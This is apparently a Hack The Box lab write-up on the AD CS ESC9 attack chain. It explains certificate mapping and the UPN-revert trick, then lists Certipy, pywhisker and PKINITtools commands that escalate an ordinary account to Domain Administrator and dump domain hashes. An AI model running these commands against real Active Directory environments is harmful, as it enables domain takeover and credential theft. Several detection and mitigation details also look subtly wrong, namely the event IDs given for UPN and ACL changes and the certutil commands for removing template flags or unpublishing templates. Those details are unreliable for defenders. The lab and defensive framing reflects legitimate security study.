# AD CS ESC9 Attack Chain — Comprehensive Playbook

**Box:** Certified (Hack The Box)  
**Attack Path:** judith.mader → WriteOwner on Management → GenericWrite on management_svc → Shadow Credentials + PKINIT → GenericAll on ca_operator → **ESC9** → Administrator  
**Key Question Addressed:** Why we revert ca_operator's UPN BEFORE authenticating with the certificate.

---

## Table of Contents

1. [What is ESC9?](#what-is-esc9)
2. [Certificate Mapping Fundamentals](#certificate-mapping-fundamentals)
3. [The szOID_NTDS_CA_SECURITY_EXT Extension](#the-szoid_ntds_ca_security_ext-extension)
4. [StrongCertificateBindingEnforcement](#strongcertificatebindingenforcement)
5. [Why the UPN Revert is REQUIRED](#why-the-upn-revert-is-required)
6. [Full Attack Chain — Certified HTB](#full-attack-chain--certified-htb)
7. [Step-by-Step Exploitation](#step-by-step-exploitation)
8. [Detection & Mitigation](#detection--mitigation)
9. [Tools Reference](#tools-reference)

---

## What is ESC9?

**ESC9** (CVE-related, part of the AD CS attack matrix) is a misconfiguration in Active Directory Certificate Services that allows a user with **GenericWrite** (or equivalent) permissions over a domain account to **impersonate any user** — including Domain Administrators — via certificate-based authentication.

ESC9 exploits the **CT_FLAG_NO_SECURITY_EXTENSION** flag on certificate templates. When this flag is set on a template, the issued certificates **do not include** the `szOID_NTDS_CA_SECURITY_EXT` security extension (which contains the enrollee's `objectSid`).

Without that extension, the DC falls back to **implicit certificate mapping** based on the UPN in the certificate's SAN. This bypasses the protections introduced after CVE-2022-26923 (Certifried).

### Key Difference from Other ESC Vulnerabilities

| ESC Type | Core Requirement | What You Exploit |
|----------|-----------------|-------------------|
| ESC1 | Template allows enrollee-supplies-subject + auth EKU | Specify arbitrary UPN/SID in CSR directly |
| ESC9 | Template has **NO_SECURITY_EXTENSION** flag + attacker has GenericWrite over an account | Manipulate the enrollee account's UPN attribute |
| ESC10 | Weak certificate mapping (StrongCertBinding=0) + any writable account | Same as ESC9 but without needing a specific template flag |

**ESC9 is NOT about crafting a malicious CSR.** It's about manipulating the **account attribute** (UPN) of a controlled account so that when it enrolls in a certificate, the resulting certificate's SAN contains the target's UPN. The CA doesn't validate that the enrollee "owns" that UPN.

---

## Certificate Mapping Fundamentals

When a user authenticates to a Domain Controller using a certificate (via PKINIT/Kerberos), the DC must determine **which AD account the certificate belongs to**. This is called **certificate mapping**.

### Two Types of Mapping

**Explicit Mapping:**
- The certificate is manually linked to an account via the `altSecurityIdentities` attribute
- Contains precise data like serial number + issuer
- Harder to abuse

**Implicit Mapping:**
- The DC automatically derives the account from fields in the certificate's SAN
- Uses **UPN** (`userPrincipalName`) or **DNS Name** (`dNSHostName`)
- This is what ESC9 exploits

### Implicit Mapping Lookup Order (for UPN)

When the DC receives a certificate with a UPN in the SAN, it performs these checks **in order**:

```
1. Search for an account where userPrincipalName == <UPN from certificate>
2. If no match: extract the domain from UPN, match the name part against sAMAccountName
3. If no match: append $ to name part, match against sAMAccountName (machine accounts)
4. If all fail: reject authentication
```

**This fallback to sAMAccountName is critical for ESC9.**

---

## The szOID_NTDS_CA_SECURITY_EXT Extension

After CVE-2022-26923 (Certifried), Microsoft introduced a new security extension with OID `1.3.6.1.4.1.311.25.2` called **szOID_NTDS_CA_SECURITY_EXT**.

This extension is **automatically added** to certificates issued by AD CS **when the enrollee does NOT supply a SAN**. It contains the **enrollee's objectSid**.

When a DC validates a certificate that includes this extension:
1. Extract the SID from the extension
2. Find the account with matching objectSid
3. Verify the certificate's subject matches that account
4. If mismatch → **reject authentication**

This was designed to prevent ESC6-style attacks where a user could request a cert with an arbitrary SAN and the CA would still issue it without the enrollee's SID.

**However**, this protection only works if the certificate **includes the extension**. Templates with the `CT_FLAG_NO_SECURITY_EXTENSION` flag (0x80000) produce certificates **without this extension**, bypassing the SID check entirely.

---

## StrongCertificateBindingEnforcement

This is a DC registry key that controls how strictly the DC validates certificates:

| Value | Behavior | ESC9/ESC10 Vulnerable? |
|-------|----------|----------------------|
| **0** | Extension not validated; only UPN/DNS SAN mapping used | ✅ Yes |
| **1** (default) | Tries to validate extension; if missing, falls back to weak SAN mapping | ✅ Yes |
| **2** | Requires extension OR explicit mapping; strict mode | ❌ No |

```
Registry Path: HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement
```

Most enterprise environments run at **value 1** for backwards compatibility with older certificates. This is exploitable via ESC9/ESC10.

---

## Why the UPN Revert is REQUIRED ⭐

This is the most important and least understood part of the ESC9 chain. Here's the exact mechanics:

### The Attack Sequence (Critical Timing)

```
[TIMESTAMP]                    ACTION                          RESULT
-----------                     -----                           ------
T1                             Change ca_operator UPN          ca_operator UPN = "Administrator@certified.local"
                              to "Administrator"
T2                             Request certificate             CA issues cert with SAN UPN = "Administrator@certified.local"
                              from vulnerable template         (this UPN is embedded in the cert)
T3                             REVERT ca_operator UPN          ca_operator UPN = "ca_operator@certified.local"
                              back to original                 (original UPN restored)
T4                             Authenticate with cert          DC sees cert with UPN="Administrator@certified.local"
                                                             → searches for account with that UPN → FINDS NONE
                                                             → falls back to sAMAccountName="Administrator"
                                                             → MAPPED TO REAL Administrator account ✅
```

### Why T3 (Revert) is Absolutely Necessary

At **T4 (authentication time)**, the DC looks up the UPN embedded in the certificate: `"Administrator@certified.local"`.

**Scenario A — We DON'T revert (WRONG):**
- ca_operator's UPN is still `"Administrator@certified.local"`
- DC finds ca_operator account (the attacker-controlled account)
- Authentication succeeds as **ca_operator** — not Administrator
- You get user's permissions, not Domain Admin

**Scenario B — We DO revert (CORRECT):**
- ca_operator's UPN is back to `"ca_operator@certified.local"`
- DC searches for `"Administrator@certified.local"` → **no account found** (because real Administrator's UPN is also something else, or empty, or different)
- DC falls back: extracts name `"Administrator"` → searches `sAMAccountName="Administrator"`
- **Finds the real Administrator account**
- Authentication succeeds as **Administrator** ✅ → Domain Admin

### The Key Insight

The certificate was **already issued at T2** with the Administrator UPN in the SAN. Reverting the UPN at T3 **does not change the certificate** — the cert still contains `Administrator@certified.local` in its SAN.

The revert forces the DC's implicit mapping lookup to **fail the UPN step** and fall through to the **sAMAccountName fallback**, which resolves to the real Administrator account.

Without reverting, the UPN lookup succeeds at step 1, mapping the cert to the **attacker's own account** — completely defeating the attack.

### But Wait — Why Does Administrator Have sAMAccountName = "Administrator"?

Because the real Administrator account's default `sAMAccountName` is literally `"Administrator"`. The DC's fallback algorithm is:

```
UPN not found → try username portion as sAMAccountName
```

And `Administrator` is the canonical sAMAccountName for the built-in Domain Admin account.

### Summary: The Revert Creates a Mapping Mismatch

| Step | ca_operator UPN | Certificate SAN UPN | DC Lookup Result | Authenticated As |
|------|----------------|--------------------|--------------------|-----------------|
| Before revert | Administrator@... | Administrator@... | Found: ca_operator | **ca_operator** ❌ |
| After revert | ca_operator@... | Administrator@... | Not found → fallback to sAMAccountName | **Administrator** ✅ |

---

## Full Attack Chain — Certified HTB

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 1: Initial Access (judith.mader)                                     │
│  ├── SMB share enumeration → found passwords                                │
│  └── WinRM access as judith.mader                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│  PHASE 2: WriteOwner on Management → Added to Management group              │
│  ├── BloodHound: judith.mader has WriteOwner on Management                   │
│  ├── Change owner to judith.mader                                           │
│  └── Add judith.mader to Management group                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│  PHASE 3: GenericWrite on management_svc → Shadow Credentials               │
│  ├── Management group has GenericWrite on management_svc                     │
│  ├── pywhisker: add shadow credential to management_svc                     │
│  ├── PKINITtools: obtain TGT for management_svc                             │
│  └── getnthash: extract NT hash of management_svc                          │
│      → user.txt                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│  PHASE 4: GenericAll on ca_operator                                         │
│  ├── management_svc has GenericAll on ca_operator                           │
│  └── Can modify all properties of ca_operator account                       │
├─────────────────────────────────────────────────────────────────────────────┤
│  PHASE 5: ESC9 — Domain Admin Compromise                                    │
│  ├── Step 1: Change ca_operator UPN → "Administrator"                        │
│  ├── Step 2: Request certificate (vulnerable template with                  │
│  │           CT_FLAG_NO_SECURITY_EXTENSION)                                 │
│  ├── Step 3: REVERT ca_operator UPN back to original                       │
│  └── Step 4: Authenticate with cert → Administrator TGT → root.txt           │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Step-by-Step Exploitation

### Prerequisites Check

Before running ESC9, confirm:
- [ ] You have **GenericWrite** or **GenericAll** over a domain account that can **enroll** in a certificate template
- [ ] The template has **CT_FLAG_NO_SECURITY_EXTENSION** (`NoSecurityExtension` in Certipy)
- [ ] The template has a **Client Authentication** EKU
- [ ] `StrongCertificateBindingEnforcement` is **NOT set to 2**
- [ ] The CA appears in the domain's NTAuthCertificates

### Enumeration

```bash
# Find vulnerable ESC9 templates
certipy find -u 'management_svc@certified.local' -p '<NT_HASH>' -dc-ip <DC_IP> -vulnerable -enabled

# Look for "NoSecurityExtension" flag and "ESC9" vulnerability marker
# Also confirm enrollment rights include your controlled account
```

### Step 1: Change Target Account's UPN

We need an account we control (ca_operator) to temporarily hold the Administrator's UPN so the CA will embed it in the certificate's SAN.

```bash
# Change ca_operator's UPN to "Administrator" (or whatever the target's name is)
certipy account update \
  -u 'management_svc@certified.local' \
  -p '<NT_HASH>' \
  -target 'ca_operator' \
  -upn 'Administrator' \
  -dc-ip <DC_IP>
```

> **Note:** Use just the username part of the UPN (no domain), Certipy appends the domain automatically.

**What happens:**
- ca_operator's `userPrincipalName` attribute becomes `"Administrator@certified.local"`
- Any certificate enrolled for ca_operator will now have this UPN in the SAN

### Step 2: Request the Certificate

```bash
# Request certificate using the ESC9-vulnerable template
# Template name from Certipy enumeration (e.g., "CorpVPN" or similar)
certipy req \
  -u 'ca_operator@certified.local' \
  -hashes '<NT_HASH>' \
  -ca 'CA_NAME' \
  -template '<TEMPLATE_NAME>' \
  -dc-ip <DC_IP>
```

> **Important:** Use the account's **NT hash** (from Pass-the-Hash) or password. You authenticated as `management_svc`, but you're enrolling as `ca_operator`. If you have the NT hash of ca_operator (or can PtH with it), use that.

**What happens:**
- CA issues certificate with SAN UPN = `Administrator@certified.local`
- The certificate is technically "issued to" ca_operator, but the SAN says Administrator
- Saved to `<username>.pfx`

### Step 3: REVERT the UPN (CRITICAL!)

This is the step that makes or breaks the attack:

```bash
# Restore ca_operator's original UPN
certipy account update \
  -u 'management_svc@certified.local' \
  -p '<NT_HASH>' \
  -target 'ca_operator' \
  -upn 'ca_operator@certified.local' \
  -dc-ip <DC_IP>
```

**Why this works:** The certificate still has `Administrator@certified.local` in its SAN. But now no account has that UPN. The DC's fallback maps it to the account with `sAMAccountName=Administrator` — the real Domain Admin.

### Step 4: Authenticate as Administrator

```bash
# Use the certificate to get a TGT for Administrator
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip <DC_IP>
```

**What happens:**
- DC extracts UPN from cert SAN → `Administrator@certified.local`
- No account has this UPN (we reverted it)
- Fallback: sAMAccountName = "Administrator" → found!
- TGT issued for the **real Administrator account**
- You now have Domain Admin-level access

### Step 5: Post-Exploitation

```bash
# Get the NT hash of Administrator (for Pass-the-Hash)
certipy auth -pfx 'administrator.pfx' -dc-ip <DC_IP>

# Or use LDAP shell for DCSync
certipy auth -pfx 'administrator.pfx' -dc-ip <DC_IP> -ldap-shell

# In ldap-shell:
# help                    → list available commands
# dcsync                  → extract all domain hashes (KRBTGT, Administrator, etc.)
# getdc                   → find domain controllers
```

---

## Detection & Mitigation

### Detection

**Event IDs to monitor:**

| Event ID | Description | Detection Relevance |
|----------|-------------|-------------------|
| **4886** | Certificate request received | Who requested what cert |
| **4887** | Certificate issued | Certificate details, subject/issuer |
| **4888** | Certificate request approved | Manual approval tracking |
| **4742** | Computer account changed | UPN modifications |
| **5136** | ACL modified | Changes to cert template permissions |
| **4662** | Object access (audit enabled) | msDS-KeyCredentialLink writes |

**Behavioral Indicators:**
1. **UPN changes on service/non-interactive accounts** — Service accounts rarely change their UPN; any change is suspicious
2. **Certificate enrollment from unexpected accounts** — Monitor who enrolls in which templates
3. **Certificate enrollment followed by UPN revert** — Very suspicious pattern (attacker's cleanup)
4. **Non-interactive logins using certificates** — Service accounts that normally use passwords suddenly using cert auth

**BloodHound Queries:**
```cypher
// Find all accounts with GenericWrite/GenericAll that could lead to ESC9
MATCH (u)-[r:GenericWrite|GenericAll|WriteOwner|WriteDacl|WriteProperty]->(c:User)
WHERE c.serviceprincipalname IS NULL
RETURN u.name, c.name, type(r)

// Find ESC9-vulnerable templates
MATCH (t:CertTemplate)
WHERE t.nosecurityextension = TRUE
RETURN t.name, t.enrolleesuppliessubject
```

### Mitigation

**1. Set StrongCertificateBindingEnforcement = 2**
```powershell
# On all Domain Controllers
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f
```
This is the **most impactful single fix**. Value 2 requires the szOID_NTDS_CA_SECURITY_EXT extension or explicit mapping, blocking ESC9/ESC10 entirely.

**2. Remove CT_FLAG_NO_SECURITY_EXTENSION from all templates**
```powershell
# Find templates with the flag
certutil -dstemplate | findstr "No Security Extension"

# Remove the flag (requires schema update in legacy environments)
certutil -dstemplate <TEMPLATE_NAME> msPKI-Enrollment-Flag -0x00080000
```

**3. Restrict Certificate Template Enrollment**
- Remove `Domain Users` and `Authenticated Users` from enrollment rights on templates with Client Authentication EKU
- Only grant enrollment to specific groups that legitimately need certificates

**4. Enable Manager Approval for High-Value Templates**
```powershell
# In Certificate Templates console
# Right-click template → Properties → Issuance Requirements
# Check "CA certificate manager approval"
```

**5. Audit and Monitor UPN Changes**
- Alert on UPN modifications for privileged accounts
- Alert on UPN changes followed quickly by certificate enrollment

**6. Remove Unused Templates**
```powershell
# Unpublish a template from the CA
certutil -delstore "Certificat Authority" <TEMPLATE_NAME>
```

---

## Tools Reference

### Certipy / Certipy-AD

The primary tool for ESC9 exploitation.

```bash
# Enumeration
certipy find -u 'user@domain' -p 'pass' -dc-ip IP -vulnerable -enabled

# UPN Manipulation
certipy account update -u 'user@domain' -p 'pass' -target 'TARGET' -upn 'NewUPN' -dc-ip IP

# Certificate Request
certipy req -u 'user@domain' -hashes 'NTHASH' -ca 'CA_NAME' -template 'TEMPLATE' -dc-ip IP

# Certificate Authentication (PKINIT)
certipy auth -pfx 'cert.pfx' -dc-ip IP

# LDAP Shell (post-auth)
certipy auth -pfx 'cert.pfx' -dc-ip IP -ldap-shell
```

### PyWhisker (Shadow Credentials)

```bash
# Add shadow credential
python3 pywhisker.py -d 'domain' -u 'user' -p 'pass' --target 'TARGET' --action add

# Remove shadow credential
python3 pywhisker.py -d 'domain' -u 'user' -p 'pass' --target 'TARGET' --action remove
```

### PKINITtools

```bash
# Get TGT using shadow credential (PKINIT)
python3 gettgtpkinit.py -dc-ip IP 'domain/target' 'CERT:PEM' 'output.ccache'

# Extract NT hash from ticket
python3 getnthash.py -dc-ip IP 'domain/target' 'TGT_CCache'
```

### Rubeus (Alternative)

```bash
# If using Windows implant
Rubeus.exe asktgt /user:TARGET /certificate:"BASE64_PFX" /password:"PFXPASSWORD"
```

---

## ESC9 vs ESC10 — What's the Difference?

Both attack the same root cause (weak certificate mapping), but:

| Aspect | ESC9 | ESC10 |
|--------|------|-------|
| **Root Cause** | Template has `CT_FLAG_NO_SECURITY_EXTENSION` | `StrongCertificateBindingEnforcement=0` (or 1) |
| **Prerequisite** | Must have ESC9-vulnerable template AND GenericWrite | Only needs GenericWrite + any enrollable template |
| **Scope** | Limited to templates with the NO_SECURITY_EXTENSION flag | Any certificate template with Client Authentication |
| **Flexibility** | Template-specific | Universal (broader attack surface) |

**ESC10 is the generalized version of ESC9.** If ESC10 works, ESC9 also works (given the right template). ESC9 has an additional template-level requirement that ESC10 does not.

---

## Summary: The Golden Rule of ESC9 UPN Revert

```
┌────────────────────────────────────────────────────────────────────┐
│                     THE 3-STEP MAGIC                                 │
│                                                                     │
│  1. SET UPN   → Attacker account now "is" Administrator            │
│  2. GET CERT  → Certificate issued with Administrator UPN in SAN   │
│  3. REVERT UPN→ Attacker account is "itself" again                  │
│                                                                     │
│  Certificate still has Administrator UPN → DC can't find account    │
│  → Falls back to sAMAccountName → Finds real Administrator ✅       │
│                                                                     │
│  Without Step 3: Certificate UPN matches attacker account →         │
│  You auth as yourself, not Administrator ❌                         │
└────────────────────────────────────────────────────────────────────┘
```

The revert is **not optional**. It is the mechanism that forces the DC's fallback mapping to resolve to the real Administrator account. Without it, the attack completely fails to escalate privileges.

---

## References

- Certipy Wiki: https://github.com/ly4k/Certipy/wiki
- SpecterOps AD CS Attack Paths (Whitepaper): https://specterops.io
- TrustedSec ESC15/EKUwu: https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc
- IFCR Certifried Analysis: https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
- Microsoft KB5014754: Certificate-based authentication changes on Windows domain controllers
